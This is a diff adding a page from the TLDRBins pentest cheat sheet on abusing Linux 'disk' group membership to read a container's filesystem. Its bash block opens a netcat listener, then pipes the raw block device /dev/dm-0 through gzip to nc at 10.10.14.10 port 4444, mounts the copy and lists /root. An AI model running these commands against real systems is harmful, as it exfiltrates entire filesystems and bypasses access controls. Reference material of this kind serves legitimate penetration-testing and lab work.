@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>disk | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/disk/">
+      <span>disk</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@disk/">Disk</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@mount/">Mount</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@backup/">Backup</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@privilege-read/">Privilege Read</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@container/">Container</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@lvm/">Lvm</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="abuse-disk-group-to-read-containers-filesystem">Abuse disk group to read container&rsquo;s filesystem</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show devices</span>
+</span></span><span class="line"><span class="cl">lsblk
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Show LVM mappings</span>
+</span></span><span class="line"><span class="cl">ls -l /dev/mapper/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># In our local machine</span>
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> &gt; dm-0.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Exfil filesystem (target container rootfs, e.g., dm-0)</span>
+</span></span><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>/dev/dm-0 <span class="p">|</span> gzip -1 - <span class="p">|</span> nc 10.10.14.10 <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Extract dm-0</span>
+</span></span><span class="line"><span class="cl">gunzip dm-0.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Mount the filesystem</span>
+</span></span><span class="line"><span class="cl">sudo mount dm-0-orig /mnt/ 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Privilege read</span>
+</span></span><span class="line"><span class="cl">ls /mnt/root/
+</span></span></code></pre></div><p><small><em>Note: can take a long time to transfer</em></small></p>
+</div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
